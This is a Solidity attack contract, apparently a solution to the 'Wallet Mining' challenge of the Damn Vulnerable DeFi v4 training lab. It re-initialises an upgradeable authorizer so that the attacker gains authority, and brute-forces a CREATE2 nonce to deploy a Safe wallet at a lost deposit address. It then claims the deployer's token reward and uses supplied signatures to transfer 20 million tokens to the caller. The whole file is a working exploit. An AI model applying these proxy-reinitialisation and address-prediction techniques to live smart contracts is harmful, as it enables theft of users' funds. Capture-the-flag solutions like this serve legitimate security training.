// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {AuthorizerUpgradeable} from "../AuthorizerUpgradeable.sol";
import {WalletDeployer} from "../WalletDeployer.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {DamnValuableToken} from "../../../src/DamnValuableToken.sol";
import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";

contract AttackWalletDeployer {
    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
    uint256 constant NONCE_RANGE = 1000;

    constructor(
        address authorizerProxy,
        WalletDeployer walletDeployer,
        address user,
        address ward,
        bytes memory signatures
    ) {
        address[] memory wards = new address[](1);
        wards[0] = address(this);

        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        (bool success,) = authorizerProxy.call(abi.encodeCall(AuthorizerUpgradeable.init, (wards, aims)));

        require(success, "Failed to init authorizer with attacker ward");

        address safeProxyFactory = address(walletDeployer.cook());
        address singleton = walletDeployer.cpy();

        (bytes memory initializer, uint256 nonce) = findLostParams(singleton, user, safeProxyFactory);

        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);

        DamnValuableToken token = DamnValuableToken(walletDeployer.gem());
        token.transfer(ward, token.balanceOf(address(this)));

        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
            address(token),
            0,
            abi.encodeCall(token.transfer, (msg.sender, DEPOSIT_TOKEN_AMOUNT)),
            Enum.Operation.Call,
            50000,
            0,
            0,
            address(0),
            payable(address(0)),
            signatures
        );
    }

    function findLostParams(address _singleton, address _user, address _factory)
        internal
        pure
        returns (bytes memory initializer, uint256 nonce)
    {
        bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(_singleton)));

        // Standard Safe setup for the user
        address[] memory owners = new address[](1);
        owners[0] = _user;
        initializer =
            abi.encodeCall(Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0))));

        for (uint256 j = 0; j < NONCE_RANGE; j++) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), j));

            address derived = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), _factory, salt, keccak256(deploymentData)))))
            );

            if (derived == USER_DEPOSIT_ADDRESS) {
                return (initializer, j);
            }
        }

        revert("Lost params not found");
    }
}
